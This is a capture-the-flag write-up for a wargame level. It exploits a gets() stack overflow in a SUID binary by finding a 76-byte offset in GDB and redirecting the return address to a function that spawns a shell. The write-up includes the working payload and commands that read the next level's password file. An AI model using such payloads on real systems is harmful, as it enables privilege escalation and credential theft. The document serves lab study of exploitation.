# level1

## 1. Connect to the VM

The password for `level1` is the flag obtained from `level0`:

```bash
ssh level1@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

## 3. Disassemble `main` and `run`

The binary is owned by `level2` and has the SUID bit set. It therefore runs
with `level2` privileges.

The source shows that `main` calls `gets`, which reads into a stack buffer
without checking its size. An input longer than the buffer can overwrite the
saved return address.

It also contains a `run` function that calls:

```c
system("/bin/sh");
```

Use `objdump` to find the address of `run`:

```bash
objdump -d -M intel level1
```

The `run` function starts at `0x08048444`.

The objective is therefore to overwrite the return address of `main` with the
address of `run`.

## 4. Find the offset

The offset is the number of bytes between the beginning of the buffer and the
saved return address.

```bash
gdb ./level1
```

Inside GDB, start the program:

```gdb
run
```

When the program waits for input, paste this pattern:

```text
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU
```

The program crashes. Display the instruction pointer:

```gdb
info registers eip
```

GDB reports:

```text
eip  0x54545454
```

`0x54` is the ASCII value of `T`, so the return address was overwritten by
`TTTT`. Count the groups before it:

```text
AAAA BBBB CCCC DDDD EEEE FFFF GGGG HHHH IIII JJJJ
KKKK LLLL MMMM NNNN OOOO PPPP QQQQ RRRR SSSS TTTT
                                             ^
                                      return address
```

There are 19 groups of four bytes before `TTTT`:

```text
19 * 4 = 76 bytes
```

We can confirm the result with `BBBB`, whose hexadecimal representation is
`0x42424242`:

```bash
python -c 'print "A" * 76 + "BBBB"' > /tmp/payload
```

Inside GDB:

```gdb
run < /tmp/payload
info registers eip
```

The value of `EIP` is now:

```text
eip  0x42424242
```

This confirms that the offset is **76 bytes**. The final payload has this
layout:

```text
+----------------------+--------------------------+
| 76 bytes of padding  | address of run           |
| "A" * 76             | 0x08048444               |
+----------------------+--------------------------+
```

Because x86 stores integers in little-endian order, `0x08048444` must be
written as:

```text
\x44\x84\x04\x08
```

## 5. Exploit the binary

The VM provides Python 2, so `print` can be used to generate raw bytes:

```bash
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

The program returns into `run`, which starts a shell:

```text
Good... Wait what?
```

Inside that shell, verify the effective user and read the next password:

```bash
id
cat /home/user/level2/.pass
```

The `id` output contains `euid=2021(level2)`, confirming that the shell has
the required privileges.

The same operation can be performed non-interactively:

```bash
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; \
  echo 'cat /home/user/level2/.pass') | ./level1
```

This prints the password stored in `flag`.
